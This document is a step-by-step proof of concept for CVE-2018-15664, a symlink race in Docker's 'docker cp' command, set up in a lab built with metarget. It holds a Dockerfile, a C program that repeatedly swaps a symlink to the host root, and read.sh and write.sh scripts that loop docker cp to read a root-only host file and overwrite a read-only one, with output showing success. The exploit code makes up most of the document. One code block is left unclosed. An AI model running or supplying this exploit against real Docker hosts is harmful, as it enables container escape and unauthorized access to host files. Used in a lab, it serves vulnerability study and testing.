## Proof of Concept Docker-Race-Condition-Vulnerability

To perform the Proof of Concept for CVE-2018-15664, please follow the below steps:

This is an attack that exploits the `docker cp` command

1. Prepare the environment using the following command in metarget's folder <br />
    ```
    sudo ./metarget cnv install cve-2018-15664
    ```

2. Setup the following `Dockerfile`<br />

    ```Dockerfile
    FROM ubuntu:20.04
    RUN apt-get update && apt-get install -y gcc
    COPY symlink_swap.c /symlink_swap.c
    RUN gcc -o /symlink_swap /symlink_swap.c
    ENTRYPOINT ["/symlink_swap"]
    ```
3. Create the file `symlink_swap.c` in the host as follows: <br />
    ```c
    #define _GNU_SOURCE
    #include <unistd.h>
    #include <sys/stat.h>
    #include <stdio.h>
    #include <fcntl.h>

    int main()
    {
      symlink("/", "/totally_safe_path");
      mkdir("/totally_safe_path-stashed", 0755);

      while (1)
        renameat2(AT_FDCWD, "/totally_safe_path", AT_FDCWD, "/totally_safe_path-stashed", RENAME_EXCHANGE);

      return 0;
    }
    ```
4. Perform a read exploit (**Arbitrary read**)  <br />
    - Setup flags and revoke read permissions

        ```
        $ echo "SUCCESS -- COPIED FROM THE HOST" | sudo tee /w00t_w00t_im_a_flag
        SUCCESS -- COPIED FROM THE HOST
        $ cat /w00t_w00t_im_a_flag
        SUCCESS -- COPIED FROM THE HOST
        $ sudo chmod 000 /w00t_w00t_im_a_flag
        $ cat /w00t_w00t_im_a_flag
        cat: /w00t_w00t_im_a_flag: Permission denied
        ```
    - Use the following script named `read.sh` to perform arbitrary reads:

        ```bash
        #!/bin/sh

        # Build and run the image.
        docker build -t poc .
        container_id=$(docker run --rm -d poc)

        # Now continually try to copy the files.
        i=0
        while [ $i -lt 500 ]
        do
          mkdir "ex${i}"
          docker cp "${container_id}:/totally_safe_path/w00t_w00t_im_a_flag" "ex${i}/out"
          i=$(($i + 1))
        done
        chmod 0644 ex*/out
    - Run the `read.sh` and check arbitrary reads

        ```sh
        $ ./read.sh  # Exploit (Performs 500 reads will take time)
        $ grep 'SUCCESS' ex*/out | wc -l

5. Perform a write exploit (**Arbitrary write**)
    - Setup flags and revoke write permissions

      ```
      $ echo "FAILED -- HOST FILE UNCHANGED" | sudo tee /w00t_w00t_im_a_flag
      FAILED -- HOST FILE UNCHANGED
      $ sudo chmod 0444 /w00t_w00t_im_a_flag
      $ echo "SUCCESS -- HOST FILE CHANGED" > /w00t_w00t_im_a_flag 
      bash: /w00t_w00t_im_a_flag: Permission denied
      ```
    - Use the following script named `write.sh` to perform arbitrary writes:
 
      ```bash
      #!/bin/sh

      # Build and run the image.
      docker build -t poc .
      container_id=$(docker run --rm -d poc)

      echo "SUCCESS -- HOST FILE CHANGED" > localpath

      # Now continually try to copy the files.
      i=0
      while [ $i -lt 500 ]
      do
        docker cp localpath "${container_id}:/totally_safe_path/w00t_w00t_im_a_flag"
        i=$(($i + 1))
      done
      ```
    - Run the `write.sh` to perform arbitrary writes:

      ```
      $ cat /w00t_w00t_im_a_flag
      FAILED -- HOST FILE UNCHANGED
      $ echo "SUCCESS -- HOST FILE CHANGED" > /w00t_w00t_im_a_flag
      bash: /w00t_w00t_im_a_flag: Permission denied
      $ ./write.sh  # Exploit (will take some time)
      $ cat /w00t_w00t_im_a_flag
      SUCCESS -- HOST FILE CHANGED
      ```
